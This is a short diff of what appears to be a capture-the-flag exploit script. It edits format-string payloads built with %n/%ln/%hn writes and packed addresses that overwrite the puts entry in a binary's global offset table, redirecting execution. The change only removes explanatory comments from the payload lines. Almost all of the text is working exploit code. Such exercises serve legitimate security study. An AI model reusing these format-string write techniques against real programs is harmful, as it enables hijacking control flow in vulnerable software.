@@ -42,7 +42,7 @@ address_position_offset = 12
 Use $ln because the executable is 64bit
 address = address of puts
 '''
-payload = f'%4198971x%12$ln_'.encode() + p64(puts)  # write 40 into the address 
+payload = f'%4198971x%12$ln_'.encode() + p64(puts)
 
 if is_small_payload:
     '''
@@ -78,7 +78,7 @@ if is_small_payload:
     
     After first stage, address of puts in got: 0x000000000040123b
     '''
-    payload = f'%64x%14$n_______'.encode() + f'%4596x%15$hn____'.encode() + p64(puts+2) + p64(puts) # write holidays address into puts
+    payload = f'%64x%14$n_______'.encode() + f'%4596x%15$hn____'.encode() + p64(puts+2) + p64(puts)
 
 if local: 
     if is_debug:
